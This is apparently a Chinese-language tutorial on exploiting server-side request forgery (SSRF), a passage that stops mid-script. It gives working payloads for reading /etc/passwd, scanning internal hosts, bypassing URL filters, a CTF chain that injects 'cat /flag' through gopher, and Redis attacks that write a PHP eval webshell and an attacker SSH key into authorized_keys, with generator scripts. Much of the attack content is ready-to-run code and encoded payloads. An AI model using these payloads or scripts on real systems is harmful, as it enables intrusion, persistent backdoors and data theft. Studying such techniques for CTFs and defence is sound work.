ssrf.php  &lt;?php  $a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333&#x27;, &#x27;location&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;));  $b = serialize($a);  echo $b;  $c = unserialize($b);  $c-&gt;a();    // 随便调用对象中不存在的方法, 触发\\_\\_call方法进行ssrf  ?&gt;\n\n47.xxx.xxx.72监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据：\n\n如上图所示，ssrf触发成功。\n由于它仅限于http&#x2F;https协议，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头，详情请看：《SoapClient+crlf组合拳进行SSRF》\nSSRF漏洞利用的相关协议SSRF漏洞的利用所涉及的协议有：\n\nfile协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容\n\ndict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等\n\ngopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell\n\nhttp&#x2F;s协议：探测内网主机存活\n\n\n下面我们对这些协议的利用进行逐一演示。\n常见利用方式（file、http&#x2F;s和dict协议）SSRF的利用主要就是读取内网文件、探测内网主机存活、扫描内网端口、攻击内网其他应用等，而这些利用的手法无一不与这些协议息息相关。\n以下几个演示所用的测试代码：\n// ssrf.php&lt;?php if (isset($\\_GET\\[&#x27;url&#x27;\\]))&#123;\t$link = $\\_GET\\[&#x27;url&#x27;\\];\t$curlobj = curl\\_init(); // 创建新的 cURL 资源\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); // 设置 URL 和相应的选项\t$result=curl\\_exec($curlobj); // 抓取 URL 并把它传递给浏览器\tcurl\\_close($curlobj); // 关闭 cURL 资源，并且释放系统资源\n\n\n\n// $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;\n// file\\_put\\_contents($filename, $result); \necho $result;\n\n}?&gt;\n读取内网文件（file协议）我们构造如下payload，即可将服务器上的本地文件及网站源码读取出来：\nssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwdssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php\n\n\n探测内网主机存活（http&#x2F;s协议）一般是先想办法得到目标主机的网络配置信息，如读取&#x2F;etc&#x2F;hosts、&#x2F;proc&#x2F;net&#x2F;arp、&#x2F;proc&#x2F;net&#x2F;fib_trie等文件，从而获得目标主机的内网网段并进行爆破。\n域网IP地址范围分三类，以下IP段为内网IP段：\n\nC类：192.168.0.0 - 192.168.255.255\n\nB类：172.16.0.0 - 172.31.255.255\n\nA类：10.0.0.0 - 10.255.255.255\n\n\n测试环境如下：\n\n假设WEB服务器Ubuntu上面存在上述所说的SSRF漏洞，我们构造如下payload，便可通过Ubuntu服务器发送请求去探测内网存活的主机：\nssrf.php?url&#x3D;http://192.168.52.1ssrf.php?url&#x3D;http://192.168.52.6ssrf.php?url&#x3D;http://192.168.52.25……\n为了方便，我们可以借助burpsuite的Intruder模块进行爆破，如下所示：\n\n\n将爆破的线程尽可能设的小一些。开始爆破后即可探测到目标内网中存在如下两个存活的主机（192.168.52.130和192.168.52.131）：\n\n扫描内网端口（http&#x2F;s和dict协议）同样是上面那个测试环境：\n\n我们利用dict协议构造如下payload即可查看内网主机上开放的端口及端口上运行服务的版本信息等：\nssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.131:6379&#x2F;info   &#x2F;&#x2F; redisssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.131:80&#x2F;info     &#x2F;&#x2F; httpssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.130:22&#x2F;info   &#x2F;&#x2F; ssh\n\n\n同样可以借助burpsuite来爆破内网主机上的服务。\n相关绕过姿势对于SSRF的限制大致有如下几种：\n\n限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。\n\n限制域名只能为http://www.xxx.com\n\n限制不能访问内网的IP，以防止对内网进行攻击。\n\n屏蔽返回的详细信息。\n\n\n利用HTTP基本身份认证的方式绕过如果目标代码限制访问的域名只能为 http://www.xxx.com，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http:&#x2F;&#x2F;www.xxx.com@www.evil.com\n利用302跳转绕过内网IP绕过对内网ip的限制我们可以利用302跳转的方法，有以下两种。\n（1）网络上存在一个很神奇的服务，网址为 http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：\n当我们访问：http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php。像这种网址还有http://nip.io，http://sslip.io。\n如下示例（flag.php仅能从本地访问）：\n\n（2）短地址跳转绕过，这里也给出一个网址 https://4m.cn/：\n\n直接使用生成的短连接 https://4m.cn/FjOdQ就会自动302跳转到 http://127.0.0.1/flag.php上，这样就可以绕过WAF了：\n\n进制的转换绕过内网IP可以使用一些不同的进制替代ip地址，从而绕过WAF，这里给出个从网上扒的php脚本可以一键转换：\n&lt;?php  $ip = &#x27;127.0.0.1&#x27;;  $ip = explode(&#x27;.&#x27;,$ip);  $r = ($ip\\[0\\] &lt;&lt; 24) | ($ip\\[1\\] &lt;&lt; 16) | ($ip\\[2\\] &lt;&lt; 8) | $ip\\[3\\] ;  if($r &lt; 0) &#123;  $r += 4294967296;  &#125;  echo &quot;十进制:&quot;;     // 2130706433  echo $r;  echo &quot;八进制:&quot;;     // 0177.0.0.1  echo decoct($r);  echo &quot;十六进制:&quot;;   // 0x7f.0.0.1  echo dechex($r);  ?&gt;\n\n\n\n其他各种指向127.0.0.1的地址http://localhost/         # localhost就是代指127.0.0.1http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;    # 在liunx下可用，window测试了下不行http:&#x2F;&#x2F;[::]:80&#x2F;           # 在liunx下可用，window测试了下不行http://127。0。0。1/       # 用中文句号绕过http:&#x2F;&#x2F;①②⑦.⓪.⓪.①http://127.1/http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1\n利用不存在的协议头绕过指定的协议头file_get_contents()函数的一个特性，即当PHP的file_get_contents()函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）\n测试代码：\n// ssrf.php  &lt;?php  highlight\\_file(\\_\\_FILE\\_\\_);  if(!preg\\_match(&#x27;/^https/is&#x27;,$\\_GET\\[&#x27;url&#x27;\\]))&#123;  die(&quot;no hack&quot;);  &#125;  echo file\\_get\\_contents($\\_GET\\[&#x27;url&#x27;\\]);  ?&gt;\n\n上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：\nhttpsssss:&#x2F;&#x2F;\n此时file_get_contents()函数遇到了不认识的伪协议头“httpsssss:&#x2F;&#x2F;”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：\nssrf.php?url&#x3D;httpsssss:&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd\n\n这个方法可以在SSRF的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。\n利用URL的解析问题该思路来自Orange Tsai成员在2017 BlackHat 美国黑客大会上做的题为《A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages》的分享。主要是利用readfile和parse_url函数的解析差异以及curl和parse_url解析差异来进行绕过。\n（1）利用readfile和parse_url函数的解析差异绕过指定的端口\n测试代码：\n// ssrf.php&lt;?php$url = &#x27;http://&#x27;. $\\_GET\\[url\\];$parsed = parse\\_url($url);if( $parsed\\[port\\] == 80 )&#123;  // 这里限制了我们传过去的url只能是80端口的\treadfile($url);&#125; else &#123;\tdie(&#x27;Hacker!&#x27;);&#125;\n\n用python在当前目录下起一个端口为11211的WEB服务：\n\n上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：\nssrf.php?url&#x3D;127.0.0.1:11211:80&#x2F;flag.txt\n\n如上图所示成功读取了11211端口中的flag.txt文件，下面用BlackHat的图来说明原理：\n\n从上图中可以看出readfile()函数获取的端口是最后冒号前面的一部分（11211），而parse_url()函数获取的则是最后冒号后面的的端口（80），利用这种差异的不同，从而绕过WAF。\n这两个函数在解析host的时候也有差异，如下图：\n\nreadfile()函数获取的是@号后面一部分（evil.com），而parse_url()函数获取的则是@号前面的一部分（google.com），利用这种差异的不同，我们可以绕过题目中parse_url()函数对指定host的限制。\n（2）利用curl和parse_url的解析差异绕指定的host\n原理如下：\n\n从上图中可以看到curl()函数解析的是第一个@后面的网址，而parse_url()函数解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中parse_url()函数对指定host的限制。\n测试代码：\n&lt;?phphighlight\\_file(\\_\\_FILE\\_\\_);function check\\_inner\\_ip($url)&#123;    $match\\_result=preg\\_match(&#x27;/^(http|https)?:\\\\/\\\\/.\\*(\\\\/)?.\\*$/&#x27;,$url);    if (!$match\\_result)    &#123;        die(&#x27;url fomat error&#x27;);    &#125;    try    &#123;        $url\\_parse=parse\\_url($url);    &#125;    catch(Exception $e)    &#123;        die(&#x27;url fomat error&#x27;);        return false;    &#125;    $hostname=$url\\_parse\\[&#x27;host&#x27;\\];    $ip=gethostbyname($hostname);    $int\\_ip=ip2long($ip);    return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int\\_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int\\_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int\\_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int\\_ip&gt;&gt;16;// 检查是否是内网ip&#125;function safe\\_request\\_url($url)&#123;    if (check\\_inner\\_ip($url))    &#123;        echo $url.&#x27; is inner ip&#x27;;    &#125;    else    &#123;        $ch = curl\\_init();        curl\\_setopt($ch, CURLOPT\\_URL, $url);        curl\\_setopt($ch, CURLOPT\\_RETURNTRANSFER, 1);        curl\\_setopt($ch, CURLOPT\\_HEADER, 0);        $output = curl\\_exec($ch);        $result\\_info = curl\\_getinfo($ch);        if ($result\\_info\\[&#x27;redirect\\_url&#x27;\\])        &#123;            safe\\_request\\_url($result\\_info\\[&#x27;redirect\\_url&#x27;\\]);        &#125;        curl\\_close($ch);        var\\_dump($output);    &#125;&#125;$url = $\\_GET\\[&#x27;url&#x27;\\];if(!empty($url))&#123;    safe\\_request\\_url($url);&#125;?&gt;\n\n上述代码中可以看到check_inner_ip函数通过url_parse()函数检测是否为内网IP，如果不是内网 IP ，则通过curl()请求 url 并返回结果，我们可以利用curl和parse_url解析的差异不同来绕过这里的限制，让parse_url()处理外部网站网址，最后curl()请求内网网址。paylaod如下：\nssrf.php?url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:&#x38;&#x30;&#x40;&#x77;&#x77;&#x77;&#x2e;&#98;&#x61;&#x69;&#100;&#117;&#x2e;&#x63;&#111;&#x6d;&#x2F;flag.php\n\n的 [2020 首届“祥云杯”网络安全大赛]doyouknowssrf这道题利用的就是这个思路。\n常见攻击方式（Gopher协议）Gopher协议在SSRF中的利用Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP 70端口。但在WWW出现后，Gopher失去了昔日的辉煌。\n现在的Gopher协议已经很少有人再使用它了，但是该协议在SSRF中却可以发挥巨大的作用，可以说是SSRF中的万金油。由于Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面。\n（1）Gopher协议格式\nURL: gopher:&#x2F;&#x2F;:&#x2F;_后接TCP数据流  \n# 注意不要忘记后面那个下划线”_“，下划线”_“后面才开始接TCP数据流，如果不加这个”_“，那么服务端收到的消息将不是完整的，该字符可随意写。\n\ngopher的默认端口是70\n\n如果发起POST请求，回车换行需要使用%0d%0a来代替%0a，如果多个参数，参数之间的&amp;也需要进行URL编码\n\n\n\n那么如何利用Gopher发送HTTP的请求呢？例如GET请求。我们直接发送一个原始的HTTP包不就行了吗。在gopher协议中发送HTTP的数据，需要以下三步：\n\n抓取或构造HTTP数据包\n\nURL编码、将回车换行符%0a替换为%0d%0a\n\n发送符合gopher协议格式的请求\n\n\n\n（2）利用Gopher协议发送HTTP GET请求\n测试代码：\n// echo.php  &lt;?php  echo &quot;Hello &quot;.$\\_GET\\[&quot;whoami&quot;\\].&quot;\\\\n&quot;  ?&gt;\n\n接下来我们构造payload。一个典型的GET型的HTTP包类似如下：\nGET /echo.php?whoami=Bunny HTTP/1.1  Host: 47.xxx.xxx.72\n\n然后利用以下脚本进行一步生成符合Gopher协议格式的payload：\nimport urllib.parse  payload =\\\\  &quot;&quot;&quot;GET /echo.php?whoami=Bunny HTTP/1.1  Host: 47.xxx.xxx.72  &quot;&quot;&quot;    \n\n# 注意后面一定要有回车，回车结尾表示http请求结束  \ntmp = urllib.parse.quote(payload)  new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)  result = &#x27;gopher://47.xxx.xxx.72:80/&#x27;+&#x27;\\_&#x27;+new  print(result)\n\n\n\n注意这几个问题：\n\n问号（?）需要转码为URL编码，也就是%3f\n\n回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a\n\n在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）\n\n\n\n然后执行：\ncurl gopher://47.xxx.xxx.72:80/\\_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A\n\n\n如上图，成功用GET方法传参并输出“Hello Bunny”。\n（3）利用Gopher协议发送HTTP POST请求\n测试代码：\n// echo.php  &lt;?php  echo &quot;Hello &quot;.$\\_POST\\[&quot;whoami&quot;\\].&quot;\\\\n&quot;  ?&gt;\n\n接下来我们构造payload。一个典型的POST型的HTTP包类似如下：\nPOST /echo.php HTTP/1.1Host: 47.xxx.xxx.72Content-Type: application/x-www-form-urlencodedContent-Length: 12whoami=Bunny\n\n注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami&#x3D;Bunny”的长度。\n最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议\nimport urllib.parsepayload =\\\\&quot;&quot;&quot;POST /echo.php HTTP/1.1Host: 47.xxx.xxx.72Content-Type: application/x-www-form-urlencodedContent-Length: 12whoami=Bunny&quot;&quot;&quot;  \n\n\n注意后面一定要有回车，回车结尾表示http请求结束tmp = urllib.parse.quote(payload)new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)result = &#x27;gopher://47.xxx.xxx.72:80/&#x27;+&#x27;\\_&#x27;+newprint(result)\n\n\n然后执行：\ncurl gopher://47.xxx.xxx.72:80/\\_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A\n\n\n如上图，成功用POST方法传参并输出“Hello Bunny”。\n[2020 科来杯初赛]Web1这道题就是典型的运用Gopher发送HTTP POST请求进行SSRF攻击的思路。\n[2020 科来杯初赛]Web1进入题目后即给处源码：\n\n这里很明显就是一个SSRF，url过滤了file、ftp，但是必须要包含127.0.0.1。并且，我们还发现一个tool.php页面，但是该页面进去之后仅显示一个“Not localhost”，我们可以用这个ssrf将tool.php的源码读住来，构造反序列化payload：\n&lt;?php  class Welcome &#123;  protected $url = &quot;http://127.0.0.1/tool.php&quot;;&#125;  $poc = new Welcome;  //echo serialize($poc);  echo urlencode(serialize($poc));  ?&gt;\n\n生成：\nO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Ftool.php%22%3B%7D// O:7:&quot;Welcome&quot;:1:&#123;s:6:&quot;\\*url&quot;;s:25:&quot;http://127.0.0.1/tool.php&quot;;&#125;\n\n将Welcome后面表示对象属性个数的“1”改为“2”即可绕过__destruct()的限制。\n\n读出来tool.php的源码为：\n#tool.php&lt;?phperror\\_reporting(0);$respect\\_show\\_ping = function($params) &#123;   extract($params);   $ip = isset($ip) ? $ip :&#x27;127.0.0.1&#x27;;   system(&#x27;ping -c 1 &#x27;.$ip);&#125;;if ($\\_SERVER\\[&quot;REMOTE\\_ADDR&quot;\\] !== &quot;127.0.0.1&quot;)&#123;   echo &#x27;&lt;h2&gt;Not localhost!&lt;/h2&gt;&#x27;;&#125;else &#123;   highlight\\_file(\\_\\_FILE\\_\\_);   $respect\\_show\\_ping($\\_POST);&#125;?&gt;\n\n可知tool.php页面存在命令执行漏洞。当REMOTE_ADDR为127.0.0.1时才可执行命令。REMOTE_ADDR头获取的是客户端的真实的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个值是不可以伪造的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，用户的请求会经过代理再到服务器，这个时候REMOTE_ADDR会被设置为代理机器的IP值。而X-Forwarded-For的值是可以篡改的。\n既然这里要求当REMOTE_ADDR为127.0.0.1时才可执行命令，且REMOTE_ADDR的值是不可以伪造的，我们要想让REMOTE_ADDR的值为127.0.0.1，不可能通过修改X-Forwarded-For的值来实现，我们要利用SSRF。\n我们可以利用index.php页面的SSRF利用gopher协议发POST包请求tool.php，进行命令执行。这样，整个攻击过程是在服务端进行的REMOTE_ADDR的值也就是127.0.0.1了。\nSSRF，利用gopher发POST包，进行命令执行\nimport urllib.parsetest =\\\\&quot;&quot;&quot;POST /tool.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 13ip=;cat /flag&quot;&quot;&quot;  \n\n#注意后面一定要有回车，回车结尾表示http请求结束\ntmp = urllib.parse.quote(test)new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;\\_&#x27;+newprint(result)\n\n这里因为我们是把payload发送到服务端让服务端执行，所以我们的Host和gopher里的Host为127.0.0.1。\n生成gopher协议格式的payload为：\ngopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A\n\n然后构造反序列化exp：\n&lt;?phpclass Welcome &#123;    protected $url = &quot;gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A&quot;;    &#125;$poc = new Welcome;//echo serialize($poc);echo urlencode(serialize($poc));?&gt;\n\n生成payload：\nO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A197%3A%22gopher%3A%2F%2F127.0.0.1%3A80%2F\\_POST%2520%2Ftool.php%2520HTTP%2F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2Fflag%250D%250A%22%3B%7D\n\n同样将Welcome后面表示对象属性个数的“1”改为“2”绕过__destruct()的限制后执行：\n\n如上图，命令执行成功。\n注意：这里要注意的是，我们发送的是POST包，而如果发送的是GET包的话，当这个URL经过服务器时，payload部分会被自动url解码，%20等字符又会被转码为空格。所以，curl_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要对payload进行二次URL编码。编码结果类似如下：\ngopher%3a%2f%2f127.0.0.1%3a80%2f\\_POST%2520%2ftool.php%2520HTTP%2f1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2fflag%250D%250A\n\n\n\n攻击内网Redis\nRedis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。\n\n什么是Redis未授权访问？\nRedis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。\n简单说，漏洞的产生条件有以下两点：\n\nredis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。\n\n没有设置密码认证（一般为空），可以免密码远程登录redis服务。\n\n\n\n在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等，其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~&#x2F;.ssh目录或&#x2F;var&#x2F;spool&#x2F;cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。\n下面我们对攻击Redis的手法进行演示。测试环境如下，内网中其他主机均有外网IP并可以上网：\n\n在上文扫描内网端口的实验中，我们发现了内网中有一个IP为192.168.52.131的主机在6379端口上运行着一个Redis服务，下面我们就用它来演示，通过Ubuntu服务器上的SSRF漏洞去攻击内网主机（192.168.52.131）的Redis。\n绝对路径写WebShell首先构造redis命令：\nflushall  set 1 &#x27;&lt;?php eval($\\_POST\\[&quot;whoami&quot;\\]);?&gt;&#x27;  config set dir /var/www/html  config set dbfilename shell.php  save\n\n然后写一个脚本，将其转化为Gopher协议的格式（脚本时从网上嫖的，谁让我菜呢~~~大佬勿喷）：\nimport urllibprotocol=&quot;gopher://&quot;ip=&quot;192.168.52.131&quot;port=&quot;6379&quot;shell=&quot;\\\\n\\\\n&lt;?php eval($\\_POST\\[\\\\&quot;whoami\\\\&quot;\\]);?&gt;\\\\n\\\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=\\[&quot;flushall&quot;,\t &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),\t &quot;config set dir &#123;&#125;&quot;.format(path),\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),\t &quot;save&quot;\t \\]if passwd:\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;def redis\\_format(arr):\tCRLF=&quot;\\\\r\\\\n&quot;\tredis\\_arr = arr.split(&quot; &quot;)\tcmd=&quot;&quot;\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))\tfor x in redis\\_arr:\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)\tcmd+=CRLF\treturn cmdif \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:\tfor x in cmd:\t\tpayload += urllib.quote(redis\\_format(x))\tprint payload\n\n执行后生成paylaod如下：\n\n这里将生成的payload要进行url二次编码（因为我们发送payload用的是GET方法），然后利用Ubuntu服务器上的SSRF漏洞，将二次编码后的payload打过去就行了：\nssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524\\_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A\n\n如下所示，成功在主机192.168.52.131上面写入WebShell：\n\n写SSH公钥同样，我们也可以直接这个存在Redis未授权的主机的&#x2F;.ssh目录下写入SSH公钥，直接实现免密登录，但前提是&#x2F;.ssh目录存在，如果不存在我们可以写入计划任务来创建该目录。\n构造redis命令：\nflushall  set 1 &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami  &#x27;  config set dir /root/.ssh/  config set dbfilename authorized\\_keys  save\n\n然后编写脚本，将其转化为Gopher协议的格式：\nimport urllibprotocol=&quot;gopher://&quot;ip=&quot;192.168.52.131&quot;port=&quot;6379&quot;ssh\\_pub=&quot;\\\\n\\\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\\\\n\\\\n&quot;filename=&quot;authorized\\_keys&quot;path=&quot;/root/.ssh/&quot;passwd=&quot;&quot;cmd=\\[&quot;flushall&quot;,\t &quot;set 1 &#123;&#125;&quot;.format(ssh\\_pub.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),\t &quot;config set dir &#123;&#125;&quot;.format(path),\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),\t &quot;save&quot;\t \\]if passwd:\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;def redis\\_format(arr):\tCRLF=&quot;\\\\r\\\\n&quot;\tredis\\_arr = arr.split(&quot; &quot;)\tcmd=&quot;&quot;\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))\tfor x in redis\\_arr:\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)\tcmd+=CRLF\treturn cmdif \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:\tfor x in cmd:\t\tpayload += urllib.quote(redis\\_format(x))\tprint 